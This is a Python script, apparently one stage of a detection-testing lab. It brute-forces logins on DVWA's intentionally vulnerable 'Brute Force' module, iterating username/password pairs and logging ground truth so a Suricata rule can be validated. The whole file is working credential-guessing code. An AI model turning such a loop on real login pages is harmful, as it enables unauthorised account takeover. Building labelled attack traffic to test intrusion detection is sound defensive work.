"""
Stage 2 - Brute force credential access (MITRE TA0006 / T1110)

Targets DVWA's own "Brute Force" vulnerability module
(vulnerabilities/brute/), which at low security level takes GET params
`username` and `password` and returns a distinguishable success/failure
message. This maps 1:1 onto Suricata rule sid 9000010 (repeated requests
to vulnerabilities/brute/ from one source).
"""
import itertools
import time

import config
from attacks.dvwa_session import DvwaSession, GroundTruth, now_iso

SUCCESS_MARKER = "Welcome to the password protected area"
FAILURE_MARKER = "Username and/or password incorrect"


def run(dvwa: DvwaSession, gt: GroundTruth) -> dict:
    attempts = []
    cracked = None
    with gt.stage("bruteforce", {"usernames": config.BRUTE_FORCE_USERNAMES}):
        for username, password in itertools.product(config.BRUTE_FORCE_USERNAMES, config.BRUTE_FORCE_PASSWORDS):
            r = dvwa.get("vulnerabilities/brute/", params={
                "username": username, "password": password, "Login": "Login",
            })
            success = SUCCESS_MARKER in r.text
            attempts.append({"username": username, "password": password, "success": success})
            gt.note("bruteforce", "login attempt", username=username, password=password,
                    success=success, timestamp=now_iso())
            if success:
                cracked = {"username": username, "password": password}
                break
            time.sleep(0.2)  # keep requests within the Suricata threshold window, not evasive
        if cracked:
            gt.note("bruteforce", "credentials cracked", **cracked)
    return {"attempts": len(attempts), "cracked": cracked}


if __name__ == "__main__":
    dvwa = DvwaSession()
    dvwa.login()
    run(dvwa, GroundTruth())
